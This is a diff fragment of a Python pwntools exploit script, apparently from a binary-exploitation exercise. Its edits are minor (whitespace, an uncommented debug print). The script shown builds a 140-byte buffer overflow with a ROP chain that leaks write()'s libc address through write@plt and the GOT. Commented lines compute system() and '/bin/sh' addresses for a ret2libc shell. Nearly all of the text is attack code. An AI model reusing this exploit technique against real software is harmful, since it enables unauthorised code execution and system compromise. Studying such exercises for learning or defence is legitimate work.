@@ -20,7 +20,7 @@ print 'vulfun= ' + hex(vulfun_addr)
 #payload1 = 'a'*140 + hex(plt_write) + hex(vulfun_addr) + hex(1)+ hex(got_write)+ hex(4)
 
 payload1 = 'a'*140 + struct.pack("I", plt_write) + struct.pack("I",vulfun_addr) + struct.pack("I",1) +struct.pack("I",got_write)+ struct.pack("I",4)
-
+	
 
 print payload1
 print "\n###sending payload1 ...###"
@@ -28,13 +28,15 @@ p.send(payload1)
 
 print "\n###receving write() addr...###"
 write_addr = u32(p.recv(4))
-#print 'write_addr=' + hex(write_addr)
+print 'write_addr=' + hex(write_addr) ##############direccion write
 
 # print "\n###calculating system() addr and \"/bin/sh\" addr...###"
 # libcwrite=libc.symbols['write'] 
+
 # print "libcwrite "+hex(libcwrite)
 # libcsystem=libc.symbols['system']
 # print "libcsystem "+hex(libcsystem)
+
 # resta=libcwrite-libcsystem
 # print(hex(resta))
 
